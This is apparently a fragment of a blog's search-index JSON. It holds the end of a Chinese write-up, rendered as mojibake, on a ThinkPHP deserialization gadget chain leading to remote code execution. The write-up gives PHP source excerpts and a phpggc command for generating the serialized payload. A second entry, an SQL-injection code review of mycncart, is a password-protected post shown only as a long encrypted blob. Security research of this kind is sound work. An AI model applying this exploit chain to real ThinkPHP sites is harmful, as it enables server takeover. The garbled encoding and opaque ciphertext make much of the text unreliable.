·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåˆ°äº†è°ƒç”¨checkAllowFieldsçš„ä½ç½® 1234567891011121314151617protected function checkAllowFields(): array&#123; // æ£€æµ‹å­—æ®µ if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db();// æœ€ç»ˆçš„è§¦å‘__toStringçš„å‡½æ•° $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; return $this-&gt;field; &#125; // ...&#125; åŒæ ·ï¼Œä¸ºäº†åˆ°$this-&gt;db()å‡½æ•°çš„è°ƒç”¨ï¼Œéœ€è¦ æ„é€ $this-&gt;fieldä¸ºç©º æ„é€ $this-&gt;schemaä¸ºç©º å…¶å®è¿™ä¸¤ä¸ªåœ°æ–¹ä¸éœ€è¦æ„é€ ï¼Œé»˜è®¤éƒ½ä¸ºç©º æœ€ç»ˆï¼Œæˆ‘ä»¬ç»ˆäºåˆ°äº†å¯ä»¥è§¦å‘__toStringçš„ä½ç½® 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix)// toString -&gt;pk($this-&gt;pk); çœ‹åˆ°ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²æ‹¼æ¥äº†å˜›ï¼ï¼ï¼ ä¸è¿‡ä¸ºäº†è¾¾åˆ°è¯¥å‡ºæ‹¼æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—é¦–å…ˆæ»¡è¶³connectå‡½æ•°çš„è°ƒç”¨ã€‚æ­¤å¤„ä»£ç å°±ä¸è¯´äº†ï¼Œç½®$this-&gt;connectionä¸ºmysqlå³å¯ã€‚æ¥ä¸‹æ¥ï¼Œä¸ç®¡æ˜¯è®¾$this-&gt;nameè¿˜æ˜¯$this-&gt;suffixä¸ºæœ€ç»ˆçš„è§¦å‘__toStringçš„å¯¹è±¡ï¼Œéƒ½ä¼šæœ‰åŒæ ·çš„æ•ˆæœã€‚ åç»­çš„æ€è·¯ï¼Œå°±æ˜¯åŸæ¥vendor/topthink/think-orm/src/model/concern/Conversion.phpçš„__toStringå¼€å§‹çš„åˆ©ç”¨é“¾ï¼Œä¸åœ¨å™è¿°ã€‚ æˆ‘æŠŠexpé›†æˆåˆ°äº†phpggcä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ 1./phpggc -u ThinkPHP/RCE2 'phpinfo();' è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚"},{"title":"ã€Code Reviewã€‘mycncart sqli","permalink":"http://blog.0kami.cn/2019/02/25/mycncart-v2-0-0-3-sqli/","text":"welcome to my blog, enter password to read. Incorrect Password! No content to display! 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